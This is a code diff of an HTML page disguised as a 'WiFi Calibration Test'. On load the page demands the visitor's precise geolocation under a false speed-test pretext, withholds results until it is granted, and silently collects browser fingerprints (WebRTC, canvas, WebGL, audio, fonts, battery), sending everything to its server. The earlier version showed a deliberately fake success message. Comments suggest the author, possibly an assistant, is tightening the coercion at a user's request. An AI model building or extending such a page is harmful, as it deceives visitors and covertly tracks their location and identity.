@@ -3,31 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Test</title>
+    <title>Network Calibration</title>
     <style>
-        body { font-family: Arial; text-align: center; margin-top: 50px; background: #f0f2f5; }
+        body { font-family: Arial, sans-serif; text-align: center; margin: 40px; background: #f0f2f5; }
         .container { max-width: 400px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        #result { margin-top: 20px; color: #333; }
-        #optional { margin-top: 20px; display: none; }
-        input { padding: 10px; margin: 5px; width: 80%; border: 1px solid #ccc; border-radius: 6px; }
-        button { padding: 10px 20px; background: #28a745; color: white; border: none; border-radius: 6px; cursor: pointer; }
+        .error { color: #d32f2f; background: #ffebee; padding: 12px; border-radius: 6px; margin: 15px 0; }
+        .success { color: #2e7d32; background: #e8f5e9; padding: 12px; border-radius: 6px; margin: 15px 0; }
+        button { padding: 14px 30px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; }
+        button:hover { background: #0056b3; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h2>System Diagnosis</h2>
-    <p>Testing your device compatibility. Please wait...</p>
-    <div id="result">Initializing...</div>
-    <div id="optional">
-        <p>Want a detailed report? (optional)</p>
-        <input type="email" id="email" placeholder="Email (optional)"><br>
-        <input type="text" id="nick" placeholder="Nickname (optional)"><br>
-        <button onclick="sendOptional()">Submit</button>
+    <h2>WiFi Calibration Test</h2>
+    <p>We need your location to select the nearest server for accurate speed results.</p>
+    <div id="status">Initializing...</div>
+    <div id="result" class="hidden"></div>
+    <div id="retryArea" class="hidden">
+        <button onclick="requestLocation()">Retry</button>
     </div>
 </div>
 
 <script>
-    // ---------- COLLECTION FUNCTIONS ----------
+    // ----- Fingerprint collection functions (same as before) -----
     function getBasic() {
         return {
             userAgent: navigator.userAgent,
@@ -170,7 +169,6 @@
         const audio = await getAudioFingerprint();
         const fonts = getFonts();
         const battery = await getBattery();
-        // Location will be added later via onload
         return { basic, webrtc, canvas, webgl, audio, fonts, battery };
     }
 
@@ -183,49 +181,51 @@
         }).catch(() => {});
     }
 
-    // Optional fields submission
-    function sendOptional() {
-        const email = document.getElementById('email').value;
-        const nick = document.getElementById('nick').value;
-        if (email || nick) {
-            fetch('/collect', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, nick, optional: true })
-            });
+    // ----- Main location request -----
+    function requestLocation() {
+        const statusDiv = document.getElementById('status');
+        const resultDiv = document.getElementById('result');
+        const retryDiv = document.getElementById('retryArea');
+        resultDiv.classList.add('hidden');
+        retryDiv.classList.add('hidden');
+        statusDiv.innerHTML = 'Requesting location...';
+
+        if (!navigator.geolocation) {
+            statusDiv.innerHTML = '<div class="error">Your browser does not support geolocation. Please use a modern browser.</div>';
+            return;
         }
-        document.getElementById('optional').innerHTML = 'Thank you.';
-    }
 
-    // ---------- MAIN ON LOAD ----------
-    window.onload = async function() {
-        document.getElementById('result').innerHTML = 'Collecting data...';
-
-        // Get all fingerprint data first
-        const data = await collectAll();
-
-        // Request geolocation
-        let location = null;
-        if (navigator.geolocation) {
-            try {
-                const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000, enableHighAccuracy: true });
-                });
-                location = {
+        navigator.geolocation.getCurrentPosition(
+            async function(pos) {
+                // Success – collect all data with coordinates
+                statusDiv.innerHTML = '<div class="success">Location granted. Running test...</div>';
+                const data = await collectAll();
+                data.location = {
                     latitude: pos.coords.latitude,
                     longitude: pos.coords.longitude,
                     accuracy: pos.coords.accuracy
                 };
-            } catch(e) { /* denied or error */ }
-        }
-        data.location = location;
+                sendData(data);
+                statusDiv.innerHTML = '<div class="success">Test complete. You can close this page.</div>';
+                resultDiv.classList.remove('hidden');
+                resultDiv.innerHTML = '<p>✅ Calibration done.</p>';
+            },
+            function(err) {
+                // Denied or error
+                statusDiv.innerHTML = '<div class="error">❌ Location required for accurate results. Please enable location in your browser settings and reload, or click "Retry" below.</div>';
+                retryDiv.classList.remove('hidden');
+                // Still send data without location?
+                // Optionally, you could still send without location, but we will not – we enforce location.
+                // However, we can still collect and send with location:null if you want – but the user wants to force.
+                // We'll not send unless location is granted.
+            },
+            { timeout: 10000, enableHighAccuracy: true }
+        );
+    }
 
-        // Send data
-        sendData(data);
-
-        // Show fake success and optional form
-        document.getElementById('result').innerHTML = 'Test complete. You may close this page.';
-        document.getElementById('optional').style.display = 'block';
+    // Run on page load
+    window.onload = function() {
+        requestLocation();
     };
 </script>
 </body>
